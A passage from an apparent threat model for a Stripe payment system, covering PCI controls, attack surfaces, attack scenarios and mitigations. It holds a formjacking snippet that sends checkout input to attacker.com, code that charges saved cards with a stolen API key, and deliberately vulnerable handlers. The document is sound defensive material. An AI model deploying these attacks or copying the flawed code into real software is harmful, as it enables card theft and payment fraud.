[7] Issuing Bank -> Card Network -> Stripe -> Payment Service
    Authorization response: approved/declined + auth code
    Stripe translates to PaymentIntent status update

[8] Payment Service -> Kafka Event Bus (async)
    Event: payment.completed
    Payload: {payment_id, user_id, order_id, amount_cents, currency, status}
    NOTE: No card data in events

[9] Stripe -> Merchant (webhook, T+minutes)
    POST /webhooks/stripe
    Body: Stripe event object (PI succeeded, charge created, etc.)
    Signature: HMAC-SHA256 validated before processing
```

### Serialization Formats

| Stage | Format | Notes |
|---|---|---|
| Browser → Stripe (tokenization) | JSON over HTTPS | Stripe.js handles; merchant never sees |
| Browser → API (confirmation) | JSON | `application/json` |
| API → Stripe (server-to-server) | `x-www-form-urlencoded` | Stripe API v1 format |
| Stripe → API (webhook) | JSON | Signature validated |
| Payment Service → PostgreSQL | PostgreSQL wire protocol | Parameterized queries |
| Payment Service → Kafka | Protobuf or JSON | Schema-registered in Schema Registry |
| Payment Service → Stripe API | URL-encoded form data | Per Stripe API spec |

### Data That Must Never Be Persisted (PCI DSS Requirements)

```
ABSOLUTELY PROHIBITED from storage (PCI DSS 3.2.1):
- Full PAN (only last 4 digits for display)
- CVV/CVC/CAV (card verification value)
- Full track data (magnetic stripe)
- PIN / PIN block
- Card authentication data

THESE APPLY EVEN TO LOGS, DEBUGGING OUTPUT, ANALYTICS EVENTS:
- Never log the payment_method object from Stripe if it contains card details
- Never log HTTP request bodies on payment endpoints without scrubbing
- Scrub any card-like patterns from all logs:
  regex: r'\b\d{13,19}\b' -> "[CARD_REDACTED]"
```

---

## 7. Security Controls

### PCI DSS v4.0 Control Mapping

The key controls and their technical implementations:

**PCI Requirement 2: Secure configurations**
- All services run as non-root users.
- Unnecessary ports/services disabled on all CDE hosts.
- nginx configured with: `ssl_protocols TLSv1.2 TLSv1.3;` (TLS 1.0/1.1 disabled).
- Payment Service containers run read-only filesystem where possible.

**PCI Requirement 3: Protect stored cardholder data**
- No PAN stored (use Stripe tokens).
- PostgreSQL encryption at rest (AWS RDS with KMS).
- Database-level access controls (minimum privilege DB users).

**PCI Requirement 4: Encrypt transmission**
- TLS 1.2+ on all connections.
- HSTS with preloading on all merchant domains.
- Certificate validity monitoring and auto-renewal.

**PCI Requirement 6: Secure systems and software**
- WAF deployed in front of payment endpoints.
- Dependency scanning in CI/CD pipeline.
- SAST/DAST in deployment pipeline.

**PCI Requirement 7: Restrict access**
- RBAC on all payment operations.
- Payment Service accessible only from API Gateway (network policy).
- Database accessible only from Payment Service (security group).

**PCI Requirement 8: User identification**
- All API access authenticated with short-lived JWTs.
- Service-to-service authenticated with mTLS.
- Privileged access (developers accessing CDE) requires MFA + jump host + session recording.

**PCI Requirement 10: Logging and monitoring**
- All payment transactions logged to immutable audit log.
- Log aggregation to SIEM (Splunk/Datadog) in real time.
- Alerts on anomalous patterns within 15 minutes.

---

### Encryption at Rest

**PostgreSQL (payments database):**
- AWS RDS with KMS-managed encryption (AES-256).
- Encryption key: Customer-managed KMS key (CMK) in a dedicated AWS account.
- Key rotation: Annual, automated.
- Backup encryption: Same KMS key applied to RDS snapshots.

**Individual field encryption (defense-in-depth):**
For highly sensitive fields (e.g., Stripe Customer ID which could be used to charge saved cards):
```python
from cryptography.fernet import Fernet

class EncryptedField:
    def __init__(self, kms_key_id):
        self.kms = boto3.client("kms")
        self.key_id = kms_key_id

    def encrypt(self, plaintext: str) -> bytes:
        response = self.kms.generate_data_key(
            KeyId=self.key_id,
            KeySpec="AES_256"
        )
        data_key = response["Plaintext"]  # Never stored
        ciphertext_key = response["CiphertextBlob"]  # Stored with encrypted value

        f = Fernet(base64.urlsafe_b64encode(data_key[:32]))
        encrypted_value = f.encrypt(plaintext.encode())

        # Store: envelope encryption (ciphertext_key + encrypted_value)
        return ciphertext_key + b"||" + encrypted_value
```

**Redis:**
- AWS ElastiCache with encryption-at-rest enabled (AES-256).
- Only non-cardholder data stored in Redis (idempotency keys, rate limit counters, status cache).

---

### Input Validation — Payment-Specific

```python
class PaymentRequestValidator:
    # PAN validation (if ever needed -- for merchant-side validation before tokenization)
    def luhn_check(self, card_number: str) -> bool:
        """Luhn algorithm for card number validation."""
        digits = [int(d) for d in card_number.replace(" ", "")]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(divmod(d * 2, 10))
        return checksum % 10 == 0

    # Amount validation
    def validate_amount(self, amount: any, currency: str) -> int:
        if not isinstance(amount, int):
            raise ValidationError("Amount must be integer (cents)")
        if amount <= 0:
            raise ValidationError("Amount must be positive")
        if amount > CURRENCY_LIMITS.get(currency, 999999):
            raise ValidationError(f"Amount exceeds limit for {currency}")
        return amount

    # Stripe ID validation (prevent injection)
    def validate_stripe_id(self, stripe_id: str, prefix: str) -> str:
        pattern = rf'^{re.escape(prefix)}_[a-zA-Z0-9]{{16,64}}$'
        if not re.fullmatch(pattern, stripe_id):
            raise ValidationError(f"Invalid Stripe ID format for prefix {prefix}")
        return stripe_id

    # Currency validation (ISO 4217)
    SUPPORTED_CURRENCIES = {"usd", "eur", "gbp", "cad", "aud", "jpy", "chf"}
    def validate_currency(self, currency: str) -> str:
        if currency.lower() not in self.SUPPORTED_CURRENCIES:
            raise ValidationError(f"Unsupported currency: {currency}")
        return currency.lower()
```

### Secrets Handling

```
Secrets Hierarchy for Payment System:
=====================================

1. Stripe Live API Key (sk_live_xxxxx)
   Storage: AWS Secrets Manager > prod/payment/stripe_live_key
   Access: Payment Service IAM role ONLY
   Rotation: Manual (Stripe has no auto-rotation API) -- quarterly
   Audit: Every access logged in CloudTrail

2. Stripe Webhook Signing Secret (whsec_xxxxx)
   Storage: AWS Secrets Manager > prod/payment/stripe_webhook_secret
   Access: Webhook handler Lambda / Payment Service IAM role
   Rotation: When webhook endpoint is recreated

3. PostgreSQL Payment DB Credentials
   Storage: AWS Secrets Manager > prod/payment/db_credentials
   Rotation: Automated via Secrets Manager rotation Lambda (90-day cycle)
   Access: Payment Service IAM role, Secrets Manager rotation Lambda

4. mTLS Certificates (Payment Service <-> API Gateway)
   Storage: AWS ACM Private CA
   Rotation: Automated (90-day validity, auto-renewed 30 days before expiry)
   Access: Both services retrieve from ACM at startup

5. Data Encryption Keys (for field-level encryption)
   Storage: AWS KMS CMK
   Access: Payment Service IAM role has kms:Decrypt, kms:GenerateDataKey
   Rotation: Automated annual rotation
   Audit: Every KMS API call logged in CloudTrail
```

---

## 8. Attack Surface Mapping

### All Entry Points

```
EXTERNAL ATTACK SURFACE
============================================================

Browser-facing endpoints (through CDN + nginx):
  POST /payments/confirm         <- payment confirmation
  POST /payments/refund          <- refund request (authenticated)
  GET  /payments/:id             <- payment status
  GET  /payments/history         <- user payment history
  POST /payments/methods/save    <- save card (via Stripe SetupIntent)

Webhook endpoints (Stripe callbacks):
  POST /webhooks/stripe          <- payment events from Stripe
  POST /webhooks/stripe/connect  <- if using Stripe Connect

Third-party script surface:
  js.stripe.com                  <- Stripe.js loaded into browser
  (if compromised: XSS can steal card data from iframes -- see 9.5)

INTERNAL ATTACK SURFACE
============================================================

Payment Service (accessible from API Gateway only, via mTLS):
  All /payments/* endpoints

PostgreSQL (accessible from Payment Service only):
  Port 5432 (TLS required)
  DB user: payment_app (minimum privilege)

Redis (accessible from Payment Service only):
  Port 6380 (TLS required)
  Auth required

Stripe API (outbound from Payment Service):
  api.stripe.com:443

Settlement Worker (internal):
  Access to PostgreSQL + Stripe API

INDIRECT SURFACES
============================================================

- Stripe API key (compromised -> arbitrary charges to customer accounts)
- Stripe webhook secret (compromised -> forged webhooks -> false payment confirmations)
- DNS (hijacking -> MITM on card tokenization)
- Email (phishing for saved card access)
- mTLS certificates (revocation needed if compromised)
```

### Attack Surface Diagram

```
                              INTERNET
                                 |
                  +--------------+-------------+
                  |              |             |
         +--------v------+ +-----v------+ +----v-----+
         | WAF/Cloudflare| | Stripe CDN | | Attacker |
         | (DDoS, L7)    | | (Stripe.js)| | Probes   |
         +--------+------+ +-----+------+ +----------+
                  |              |
         +--------v--------------v-------+
         |   nginx (TLS term, rate limit) |
         |   ATTACK: TLS downgrade,       |
         |   Host header injection,       |
         |   Request smuggling            |
         +--------+----------------------+
                  |
         +--------v--------------------+
         |   API Gateway               |
         |   JWT validation            |
         |   ATTACK: JWT bypass,       |
         |   token theft               |
         +--------+--------------------+
                  | (mTLS required)
         +--------v----------------------------------------------+
         | PAYMENT SERVICE (CDE)                                  |
         |                                                        |
         | ATTACK:                                                |
         | - Price manipulation (amount in request != DB total)  |
         | - Double charge (idempotency bypass)                   |
         | - Unauthorized refund (authz bypass)                   |
         | - Stripe key exfiltration                              |
         | - Race condition on capture                            |
         +---+-------------------+------------------------------+
             |                   |
    +--------v------+   +--------v------+
    | PostgreSQL    |   | Redis         |
    | (payments)    |   | (idem, cache) |
    | ATTACK:       |   | ATTACK:       |
    | - SQL inject  |   | - Cache poison|
    | - Data exfil  |   | - Idem bypass |
    | - Audit log   |   |               |
    |   tampering   |   +---------------+
    +---------------+
             |
    +--------v---------------+
    | Stripe API             |
    | ATTACK:                |
    | - API key theft        |
    | - Webhook forgery      |
    | - Refund fraud         |
    +------------------------+

TRUST BOUNDARIES:
  [TB-1] Internet -> nginx: Zero trust. TLS + WAF enforced.
  [TB-2] nginx -> API Gateway: Trusted internal network + header forwarding.
  [TB-3] API Gateway -> Payment Service: mTLS + JWT validated.
  [TB-4] Payment Service -> PostgreSQL: Trusted internal + TLS + DB auth.
  [TB-5] Payment Service -> Stripe: HTTPS + API key auth + cert pinning.
  [TB-6] Stripe -> Merchant (webhooks): HMAC signature validation.
  [TB-7] Browser -> Stripe (tokenization): Direct; merchant not in path.
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 — Price Manipulation Attack

**Attacker Assumptions:**
- Attacker is a registered user of the merchant platform.
- Items in cart cost $99.99. Attacker wants to pay $0.01.
- The payment confirmation endpoint accepts `amount_cents` from the request body.
- The server does NOT independently verify the amount from its own DB.

**Step-by-Step Execution:**

1. Attacker adds items to cart normally ($99.99 total). The legitimate checkout flow creates a Stripe PaymentIntent server-side for $9999 cents.

2. Attacker opens browser developer tools and intercepts the payment confirmation request.

3. Attacker modifies the request body before sending:
   ```json
   {
     "payment_intent_id": "pi_3QFoo...",
     "order_id": "order_abc123",
     "amount_cents": 1,              // Changed from 9999 to 1
     "currency": "usd"
   }
   ```

4. **Vulnerable server code:**
   ```python
   # WRONG: Trust client-submitted amount
   stripe.PaymentIntent.modify(
       payment_intent_id,
       amount=request.body["amount_cents"]  # Attacker controls this!
   )
   ```

5. Stripe charges $0.01 instead of $99.99. The order is fulfilled for the modified amount.

**Why This Works (Without Mitigation):**
The client sends the amount; the server trusts it. No server-side cross-check against the canonical order total.

**Where Detection Could Happen:**
- Monitoring alert: payment amount significantly lower than order total.
- Anomaly detection: user's payment amount doesn't match expected cart value.
- Stripe Radar: unusual small amounts for merchant category.

**Mitigation (critical — server-side amount verification):**
```python
# CORRECT: Never trust client-submitted amount
db_order = db.fetch_one(
    "SELECT total_cents FROM orders WHERE id=$1 AND user_id=$2 AND status='checkout_ready'",
    order_id, current_user.id
)
if db_order.total_cents != request.body["amount_cents"]:
    raise AmountMismatchError()  # Reject regardless of what client sent

# Use only the server-side amount for Stripe
stripe.PaymentIntent.confirm(
    payment_intent_id,
    # Do NOT pass amount here -- it was set when PI was created server-side
)
```

---

### 9.2 — Idempotency Key Bypass (Double Charge)

**Attacker Assumptions:**
- Attacker has a legitimate payment flow in progress.
- The application uses idempotency keys to prevent double charges.
- The attacker finds a way to bypass the idempotency check.

**Step-by-Step Execution:**

1. Attacker initiates a payment. SPA generates `idempotency_key = uuid1`.
2. First request: `POST /payments/confirm` with `X-Idempotency-Key: uuid1`. Payment succeeds ($99.99 charged).
3. **Bypass attempt A:** Attacker sends a SECOND request with a DIFFERENT idempotency key:
   ```
   POST /payments/confirm
   X-Idempotency-Key: uuid2  // Different key!
   {payment_intent_id: "pi_xxx", order_id: "order_abc"}
   ```
4. If the server only deduplicates on idempotency key and NOT on payment_intent_id or order_id, the second request is treated as a new payment. The same Stripe PaymentIntent is confirmed again.
5. Stripe's PaymentIntent is already `succeeded` — confirming it again is a no-op at Stripe. BUT if the server creates a SECOND payment record in its DB and treats it as a new charge, the order might be fulfilled twice.

**The real risk:** Not the Stripe double charge (Stripe's PI is idempotent) but the merchant's internal logic creating two fulfillment events or two "payment succeeded" entries.

**Step-by-Step Execution (more dangerous variant):**

1. Attacker intercepts the network request mid-flight (or uses a custom HTTP client).
2. Sends the payment request without any idempotency key.
3. Server has no idempotency check — immediately processes.
4. Attacker retries multiple times rapidly (within a race window).
5. Multiple concurrent requests hit the payment service simultaneously.
6. Without proper locking, multiple payment records are created, multiple capture events are published, multiple fulfillments occur.

**Where Detection Could Happen:**
- Alert: Multiple payment records for the same order_id.
- Alert: Payment amount exactly equals order total N times for the same order.

**Mitigation:**
```python
# Idempotency on order_id (not just idempotency key)
# Enforce unique constraint at DB level:
CREATE UNIQUE INDEX idx_payments_order_id ON payments(order_id)
WHERE status IN ('pending', 'succeeded', 'authorized');

# Application-level check:
existing_payment = db.fetch_one(
    "SELECT id, status FROM payments WHERE order_id=$1 FOR UPDATE",
    order_id
)
if existing_payment and existing_payment.status == 'succeeded':
    return existing_payment  # Already paid -- return existing record
if existing_payment and existing_payment.status == 'pending':
    raise PaymentAlreadyInProgress()
```

---

### 9.3 — Stolen Stripe API Key — Unauthorized Charges

**Attacker Assumptions:**
- Attacker has obtained the merchant's Stripe secret API key (`sk_live_xxxxx`).
- This could happen via: code repository leak, environment variable exposure, logging leak, compromised CI/CD, compromised Secrets Manager.

**Step-by-Step Execution:**

1. Attacker has `sk_live_xxxxxx`. They can now make any Stripe API call as the merchant.

2. **Charge attack:** Attacker creates a charge against a stored customer's payment method:
   ```python
   import stripe
   stripe.api_key = "sk_live_xxxxxx"

   # List customers
   customers = stripe.Customer.list(limit=100)

   # Charge a customer's saved card
   charge = stripe.PaymentIntent.create(
       amount=100000,  # $1000
       currency="usd",
       customer="cus_xxxxx",
       payment_method="pm_xxxxx",
       confirm=True,
       off_session=True
   )
   ```

3. **Refund redirect attack (more subtle):** Instead of creating charges, attacker creates refunds for recent legitimate charges — but redirects the refund to a different bank account (if using Stripe Connect or Stripe Payouts).

4. **Data exfiltration:** Attacker lists all customers, charges, and subscriptions:
   ```python
   for customer in stripe.Customer.list(limit=100).auto_paging_iter():
       print(customer.email, customer.id)
   ```
   Attacker now has: customer emails, last-4 card digits, billing addresses, charge history. This is a major PII breach.

**Impact:**
- Financial: Unauthorized charges to customers → chargebacks → merchant loses the amount + chargeback fee ($15–$25 per chargeback).
- Reputation: Customers receive unexpected charges.
- Regulatory: Potential PCI DSS breach, GDPR notification required.

**Where Detection Could Happen:**
- Stripe Dashboard: Unusual API key activity (new IPs, unusual hours, new charge patterns).
- Stripe API key access monitoring: Alert on API calls from unexpected IPs.
- Financial monitoring: Unexpected refunds or large charges in Stripe.

**Mitigation:**
1. Use **Stripe Restricted API Keys** instead of the full secret key. Create a key with only the permissions needed:
   - `PaymentIntents: write`
   - `Charges: read`
   - No `Customers: write`, no `Payouts: write`.

2. Store API key in AWS Secrets Manager. Audit every access (CloudTrail).

3. **Stripe IP allowlisting**: Restrict which IPs can use the API key (available in Stripe settings). Only the Payment Service's outbound IPs are allowlisted.

4. Monitor Stripe for anomalous activity. Stripe provides webhook events for suspicious activities.

5. Rotate API keys immediately if any potential exposure is detected.

---

### 9.4 — Webhook Forgery Attack

**Attacker Assumptions:**
- The merchant's webhook endpoint (`POST /webhooks/stripe`) processes payment events.
- The attacker knows (or guesses) the endpoint URL.
- The webhook handler does NOT validate Stripe's HMAC signature.
- OR: The webhook handler uses `X-Stripe-Signature` but implements the validation incorrectly.

**Step-by-Step Execution:**

1. Attacker knows the merchant's webhook endpoint (URL is guessable or found via OSINT).

2. Attacker crafts a fake Stripe webhook payload:
   ```json
   {
     "id": "evt_fake_123",
     "type": "payment_intent.succeeded",
     "data": {
       "object": {
         "id": "pi_real_payment_intent_id",
         "status": "succeeded",
         "amount": 9999,
         "currency": "usd"
       }
     }
   }
   ```

3. Attacker sends this to the webhook endpoint WITHOUT a valid signature:
   ```
   POST /webhooks/stripe
   Stripe-Signature: t=1700000000,v1=FAKE_HASH
   ```

4. **Vulnerable handler:**
   ```python
   # WRONG: No signature validation
   @app.route("/webhooks/stripe", methods=["POST"])
   def stripe_webhook():
       event = request.json
       if event["type"] == "payment_intent.succeeded":
           payment_id = event["data"]["object"]["id"]
           mark_payment_succeeded(payment_id)  # Fulfills order without real payment!
   ```

5. The merchant marks the payment as succeeded and fulfills the order — no money was actually paid.

**More sophisticated variant (timing attack):**
1. Attacker initiates a legitimate purchase with a real card but immediately cancels at the issuing bank (via credit card dispute).
2. Before the cancellation propagates, attacker sends a forged `payment_intent.succeeded` webhook.
3. Merchant fulfills the order AND has a disputed charge.

**Where Detection Could Happen:**
- Stripe will NOT send a `payment_intent.succeeded` for a canceled payment. Cross-checking with Stripe API confirms the event is fake.
- The `evt_fake_123` event ID doesn't exist in Stripe's event log.

---

### 9.5 — Formjacking / Supply Chain Attack on Stripe.js

**Attacker Assumptions:**
- The merchant loads Stripe.js from their own CDN or serves it from their own domain (misconfiguration).
- OR: The attacker compromises the content delivery of `js.stripe.com` (nation-state level).
- OR: The attacker injects malicious JavaScript via an XSS vulnerability on the merchant's page.

**Step-by-Step Execution (self-hosted Stripe.js variant):**

1. Attacker discovers the merchant serves `stripe.js` from their own origin: `https://app.example.com/static/stripe.js`.

2. Attacker compromises the merchant's static asset delivery (CDN account takeover, or compromises the CI/CD pipeline that deploys static assets).

3. Attacker injects malicious code into the self-hosted `stripe.js`:
   ```javascript
   // Original Stripe.js iframe logic
   // + Injected malicious code:
   document.querySelectorAll('input[type="text"]').forEach(input => {
       input.addEventListener('change', (e) => {
           fetch('https://attacker.com/steal?d=' + btoa(e.target.value), {
               method: 'GET',
               mode: 'no-cors'
           });
       });
   });
   ```

4. Even if the merchant uses Stripe's hosted fields (iframes), the attacker's injected script can:
   - Replace the entire payment form with a fake one.
   - Intercept the `confirmPayment()` call and exfiltrate the payment data before it reaches Stripe.
   - Override `window.Stripe` with a fake implementation that captures card data.

5. Attacker collects card data from all customers checking out.

**Why self-hosting Stripe.js is prohibited:**
- Stripe.js MUST be loaded from `https://js.stripe.com/v3/`. Self-hosting breaks the security model.
- If `js.stripe.com` is compromised, the card scheme liability shifts to Stripe (they're a compliant processor). If a self-hosted version is compromised, all liability falls on the merchant.
- PCI DSS requires that the payment scripts come from a PCI-compliant provider.

**CSP as a defense:**
```http
Content-Security-Policy:
  script-src 'self' https://js.stripe.com;
  frame-src https://js.stripe.com;
  connect-src 'self' https://api.stripe.com;
```
This prevents any other domain from loading scripts or iframes on the checkout page. An XSS attempt that tries to load from `attacker.com` would be blocked by CSP.

**Where Detection Could Happen:**
- Subresource Integrity (SRI) check: if `js.stripe.com` changes its script, the SRI hash wouldn't match and the browser would block loading. (Note: SRI is NOT compatible with Stripe.js because Stripe updates it dynamically — load from their origin instead.)
- Stripe's own monitoring: unusual patterns in tokenization from a specific merchant.
- Browser security report endpoints (CSP violation reports to a collection endpoint).

---

### 9.6 — Race Condition in Capture Flow (TOCTOU)

**Attacker Assumptions:**
- Attacker is an authorized user who has placed an order.
- The payment was authorized (funds reserved) but not yet captured.
- The attacker exploits a time-of-check-time-of-use (TOCTOU) race condition in the refund/cancel-then-capture flow.

**Step-by-Step Execution:**

1. Attacker places an order for $500. Payment is authorized (held on card).

2. Attacker immediately requests a refund/cancellation. The cancel request reaches the system.

3. **Vulnerable code (non-atomic):**
   ```python
   # Thread A (settlement worker -- capture):
   payment = db.get("SELECT status FROM payments WHERE id=$1", payment_id)
   if payment.status == 'authorized':
       stripe.capture(payment_intent_id)  # Captures money
       db.update("UPDATE payments SET status='captured'", payment_id)

   # Thread B (cancellation handler -- runs concurrently):
   payment = db.get("SELECT status FROM payments WHERE id=$1", payment_id)
   if payment.status == 'authorized':
       stripe.cancel(payment_intent_id)  # Cancels the hold
       db.update("UPDATE payments SET status='cancelled'", payment_id)
   ```

4. Race condition: Both threads read `status='authorized'`. Thread B cancels first. Thread A then tries to capture an already-cancelled payment. Stripe may return an error OR (if Thread A got through first) the payment is captured but Thread B's cancel also went through. Now the funds were captured AND returned — merchant fulfilled the order AND refunded.

5. The attacker gets both the goods AND their money back.

**Where Detection Could Happen:**
- DB inconsistency: payment status transitions that are invalid (captured → cancelled).
- Stripe balance anomaly: captured amount doesn't match expected revenue.

**Mitigation (atomic state transition):**
```sql
-- Use PostgreSQL optimistic locking or FOR UPDATE
BEGIN;
SELECT id, status, version FROM payments
WHERE id = $1 AND status = 'authorized'
FOR UPDATE;  -- Row-level lock prevents concurrent modification

-- If row found and locked:
UPDATE payments
SET status = 'capturing', version = version + 1
WHERE id = $1 AND status = 'authorized' AND version = $current_version;
-- If 0 rows affected: another transaction changed it first -- abort

COMMIT;
```

```python
# Application-level atomic transition
def atomic_capture(payment_id):
    with db.transaction():
        # Lock the row
        payment = db.execute(
            "SELECT * FROM payments WHERE id=$1 AND status='authorized' FOR UPDATE NOWAIT",
            payment_id
        ).fetchone()

        if not payment:
            return  # Already captured or cancelled by another process

        # State transition
        db.execute(
            "UPDATE payments SET status='capturing' WHERE id=$1",
            payment_id
        )

    # Now capture at Stripe (outside transaction to avoid long TX)
    try:
        stripe.PaymentIntent.capture(payment.payment_intent_id)
        db.execute("UPDATE payments SET status='captured' WHERE id=$1", payment_id)
    except stripe.error.InvalidRequestError:
        db.execute("UPDATE payments SET status='capture_failed' WHERE id=$1", payment_id)
```

---

### 9.7 — Chargeback Fraud (Friendly Fraud)

**Attacker Assumptions:**
- Attacker makes a legitimate purchase with their own card.
- After receiving the goods, they dispute the charge with their bank claiming "I didn't authorize this."
- The issuing bank initiates a chargeback.

**Step-by-Step Execution:**

1. Attacker purchases a digital product (software license, game key) for $50.
2. Merchant delivers the product. No physical goods = no proof of delivery.
3. Attacker contacts their bank: "I see an unauthorized charge from Example Corp."
4. Bank initiates a chargeback: funds are automatically withdrawn from the merchant's account.
5. Merchant has 7–21 days to respond with evidence.
6. Without sufficient evidence (IP log, delivery confirmation, product usage logs), merchant loses both the $50 AND the chargeback fee (~$15).

**Why This Is an Application Security Issue:**
The application must collect and preserve evidence for chargeback defense:

```python
# Evidence collection at purchase time (for chargeback defense)
def record_purchase_evidence(user_id, payment_id, order_id, request):
    evidence = {
        "ip_address": get_real_ip(request),  # Hash for privacy, store full for legal
        "ip_geolocation": geolocate(get_real_ip(request)),
        "user_agent": request.headers.get("User-Agent"),
        "device_fingerprint": request.headers.get("X-Device-ID"),
        "user_email": user.email,
        "billing_address_verified": avs_result,  # Address Verification System result
        "cvv_verified": cvv_result,  # CVV match result
        "3ds_result": threeds_result,  # 3D Secure authentication result
        "delivery_confirmation": {"method": "digital", "delivered_at": now},
        "product_access_logs": []  # Populated when product is accessed
    }
    # Store securely -- this data may be needed years later for disputes
    db.execute("INSERT INTO payment_evidence (payment_id, evidence) VALUES ($1, $2)",
               payment_id, json.dumps(evidence))
```

**3D Secure as a chargeback defense:**
If the payment used 3D Secure authentication, the liability for fraudulent chargebacks shifts from the merchant to the issuer. This is a critical business and technical decision: requiring 3DS increases checkout friction but dramatically reduces chargeback liability.

---

## 10. Failure Points

### Under Load

**Stripe API rate limits:**
Stripe enforces rate limits on API calls. For test mode: 100 requests/second. For live mode: limits depend on account type (typically 100–1000 RPS). At peak checkout volume (flash sale), the merchant's Payment Service may exceed these limits.

```
Stripe returns: 429 Too Many Requests
Retry-After: 2

Payment Service response: 503 Service Unavailable
Impact: Checkouts fail during peak traffic
```

**Mitigation:** Exponential backoff with jitter on Stripe API calls. Queue overflow payments through SQS with retries. Negotiate higher rate limits with Stripe for known peak events.

**PostgreSQL connection exhaustion:**
Payment confirmations require DB writes (INSERT payment record + UPDATE after Stripe response). Under high concurrency, all DB connections are consumed. PgBouncer connection pooling is mandatory.

**Redis idempotency key store exhaustion:**
Each payment attempt creates a Redis key. If Redis runs out of memory, idempotency fails — double charges become possible. Monitor Redis memory and set appropriate `maxmemory` policy (`volatile-lru`: evict idempotency keys with TTL when memory is full — accepting some double-charge risk — vs. `noeviction`: fail writes when full).

**Settlement worker processing lag:**
If the settlement worker falls behind (DB lock contention, Stripe API slowness), captures are delayed. Beyond Stripe's capture window (7 days default), uncaptured authorizations expire. Funds that were authorized cannot be captured — merchant loses the sale.

**Detect:** Monitor the age of `authorized` payments. Alert if any payment is authorized for more than 5 days without capture.

### Under Attack

**DDoS on payment endpoints:**
Payment endpoints are high-value DDoS targets (disrupt business). Mitigation: Cloudflare/Shield in front of all payment endpoints. Payment endpoints specifically can require a valid session JWT (reducing attack surface to authenticated users only).

**Credential stuffing → account takeover → unauthorized charges:**
Attacker uses breached credentials to log into customer accounts. If saved payment methods exist, attacker initiates purchases. Mitigation: Rate limiting on login, CAPTCHA, MFA for payments over threshold.

**Stripe test key in production:**
If the application accidentally uses a Stripe test key (`sk_test_xxxxx`) in production, all payment processing is simulated. The merchant believes payments succeed but no money changes hands. This is a catastrophic misconfiguration, not a security attack, but has the same financial impact.

**Detection:** Monitor `stripe_charge_id` prefixes in the database. Test charges have IDs starting with `ch_test_`. Alert immediately if test-mode charges are detected in production.

### Common Misconfigurations

| Misconfiguration | Impact | Fix |
|---|---|---|
| Using test Stripe key in production | All payments are fake; no revenue | Validate key prefix (`sk_live_`) at startup |
| No idempotency key on payment requests | Double charges on network retry | Require `X-Idempotency-Key` on all payment endpoints |
| Amount from client not verified server-side | Price manipulation to pay $0.01 | Always verify amount from DB before confirming |
| Self-hosting Stripe.js | Script can be compromised; PCI violation | Always load from `https://js.stripe.com/v3/` |
| No webhook signature validation | Forged webhooks → fake payment confirmations | HMAC-SHA256 validate every webhook |
| Stripe secret key in environment variable | Visible in logs, Docker inspect, CI output | AWS Secrets Manager |
| Logging payment request bodies | PAN/CVV in logs (PCI violation) | Scrub logs; never log payment bodies |
| TLS 1.0/1.1 enabled | PCI DSS violation; possible downgrade attack | TLS 1.2+ only (`ssl_protocols TLSv1.2 TLSv1.3`) |
| No `Cache-Control: no-store` on payment responses | Sensitive payment data cached | Add `Cache-Control: no-store, no-cache` |
| Unlimited refund endpoint | Attacker refunds all historical payments | Rate limit + authorization + amount validation on refunds |
| No rate limit on payment attempts | Carding attacks (test stolen cards at scale) | Rate limit: 3 payment attempts per user per hour |

---

## 11. Mitigations

### Defense-in-Depth Strategy

**Layer 1 — Architecture (eliminate card data scope):**
- Use hosted fields (Stripe.js iframes). Raw card data never touches merchant servers.
- Load Stripe.js only from `js.stripe.com` (strict CSP to enforce).
- Store only Stripe tokens, never raw card data.
- PCI scope reduction from SAQ D → SAQ A.

**Layer 2 — Transport Security:**
- TLS 1.3 on all connections. Disable TLS 1.0/1.1/SSL 3.0.
- HSTS with preloading on all payment domains.
- Certificate pinning on server-to-server Stripe calls.
- mTLS between internal services.

**Layer 3 — Authentication and Authorization:**
- JWT validation before any payment processing.
- Server-side amount verification (never trust client).
- Order ownership verification (this order belongs to this user).
- High-value transaction MFA requirement.
- Stripe restricted API keys with minimum permissions.

**Layer 4 — Idempotency and Atomicity:**
- Mandatory idempotency keys on all payment creation endpoints.
- DB-level unique constraint on order_id in payments table.
- Atomic state transitions using `SELECT FOR UPDATE NOWAIT`.
- Webhook idempotency via event ID tracking.

**Layer 5 — Data Protection:**
- No card data in PostgreSQL, Redis, logs, or event streams.
- Field-level encryption for sensitive payment metadata (customer IDs).
- Immutable audit log (payment_events table: INSERT only).
- Log scrubbing: regex patterns to remove card-like data from all logs.

**Layer 6 — Monitoring and Response:**
- Alert on: amount mismatch attempts, unusual capture patterns, test keys in production, rate limit exceeded on payment endpoints, chargeback spike.
- Incident response playbook: API key compromise → immediately rotate key → analyze Stripe logs for unauthorized activity → notify affected customers.

### Engineering Tradeoffs

| Control | Security Benefit | Engineering Cost |
|---|---|---|
| Hosted fields (Stripe.js) | Eliminates PAN from merchant scope | Reduced UI customization; iframe constraints |
| 3D Secure on all payments | Chargeback liability shift to issuer | ~15-20% checkout abandonment increase |
| Idempotency on all mutations | Double-charge prevention | Redis dependency; key management |
| mTLS between services | Prevents lateral movement | Certificate management complexity |
| Atomic DB transitions | Race condition prevention | Transaction complexity; deadlock risk |
| Stripe restricted API key | Limits blast radius of key theft | More complex key management |
| Amount server-side verification | Price manipulation prevention | DB read on every payment (minor latency) |
| Certificate pinning | MITM prevention | Pin rotation complexity; outage risk if Stripe changes cert |

---

## 12. Observability

### Structured Log Events

```json
// Payment initiated
{
  "timestamp": "2024-11-15T10:23:45.123Z",
  "event": "payment.initiated",
  "request_id": "req-uuid-abc123",
  "payment_id": "pay-internal-uuid",
  "user_id": "user-uuid",
  "order_id": "order-uuid",
  "amount_cents": 9999,
  "currency": "usd",
  "payment_intent_id": "pi_3QFoo...",
  "idempotency_key": "idem-uuid",
  "ip_hash": "sha256:a1b2...",
  "ip_geo": "US-CA",
  "duration_ms": 5
  // NEVER LOG: card_number, cvv, expiry, full PAN
}

// Stripe API call result
{
  "event": "payment.stripe_confirm",
  "payment_id": "pay-internal-uuid",
  "stripe_pi_id": "pi_3QFoo...",
  "stripe_status": "succeeded",
  "stripe_charge_id": "ch_3QFoo...",
  "stripe_duration_ms": 432,
  "outcome": "success"
}

// Security events (never sample -- always log)
{
  "event": "payment.security.amount_mismatch",
  "payment_id": "pay-internal-uuid",
  "user_id": "user-uuid",
  "submitted_amount": 1,
  "expected_amount": 9999,
  "ip_hash": "sha256:...",
  "severity": "HIGH",
  "action": "rejected"
}

{
  "event": "payment.security.webhook_signature_invalid",
